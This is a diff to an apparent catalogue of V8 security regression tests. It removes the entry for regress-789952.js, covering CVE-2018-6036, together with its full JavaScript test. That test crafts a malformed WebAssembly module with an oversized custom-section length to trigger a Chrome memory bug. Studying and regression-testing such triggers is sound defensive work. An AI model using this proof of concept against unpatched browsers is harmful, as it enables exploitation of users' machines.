@@ -701,56 +701,6 @@ a();
 
 ---   
 
-## **regress-789952.js (chromium issue)**  
-   
-**[Issue: Security: NCSC Vulnerability Report - Google Chrome - V8 JavaScript Engine](https://crbug.com/789952)**  
-**[Commit: [wasm] Gracefully handle malformed custom sections in WebAssembly.Module.customSections().](https://chromium.googlesource.com/v8/v8/+/163c1c8)**  
-  
-Date(Commit): Thu Nov 30 18:25:09 2017  
-Components: Blink>JavaScript>WebAssembly  
-Labels: Hotlist-Merge-Review, reward-2000, Security_Impact-Stable, Security_Severity-Medium, reward-decline, allpublic, M-65, Merge-Rejected-63, merge-merged-6.4, Release-0-M64, CVE-2018-6036, CVE_description-submitted  
-Code Review: [https://chromium-review.googlesource.com/800941](https://chromium-review.googlesource.com/800941)  
-Regress: [mjsunit/regress/wasm/regress-789952.js](https://chromium.googlesource.com/v8/v8/+/master/test/mjsunit/regress/wasm/regress-789952.js)  
-```javascript
-let module_size = 19;
-let string_len = 0x00fffff0 - module_size;
-
-print("Allocating backing store: " + (string_len + module_size));
-let backing = new ArrayBuffer(string_len + module_size);
-
-print("Allocating typed array buffer");
-let buffer = new Uint8Array(backing);
-
-print("Filling...");
-buffer.fill(0x41);
-
-print("Setting up array buffer");
-buffer.set([0x00, 0x61, 0x73, 0x6D], 0);
-buffer.set([0x01, 0x00, 0x00, 0x00], 4);
-buffer.set([0], 8);
-buffer.set([0x80, 0x80, 0x80, 0x80, 0x00],  9);
-let x = string_len + 1;
-let b1 = ((x >> 0) & 0x7F) | 0x80;
-let b2 = ((x >> 7) & 0x7F) | 0x80;
-let b3 = ((x >> 14) & 0x7F) | 0x80;
-let b4 = ((x >> 21) & 0x7F);
- buffer.set([b1, b2, b3, b4], 14);
-
-print("Parsing module...");
-let m = new WebAssembly.Module(buffer);
-
-print("Triggering!");
-let c = WebAssembly.Module.customSections(m, "A".repeat(string_len + 1));
-assertEquals(0, c.length);  
-```  
-  
-[[Diff]](https://chromium.googlesource.com/v8/v8/+/163c1c8^!)  
-[src/wasm/module-decoder.cc](https://cs.chromium.org/chromium/src/v8/src/wasm/module-decoder.cc?cl=163c1c8)  
-[test/mjsunit/regress/wasm/regress-789952.js](https://cs.chromium.org/chromium/src/v8/test/mjsunit/regress/wasm/regress-789952.js?cl=163c1c8)  
-  
-
----   
-
 ## **regress-7135.js (v8 issue)**  
    
 **[Issue: Ignition records incorrect feedback for unary ops](https://crbug.com/v8/7135)**  
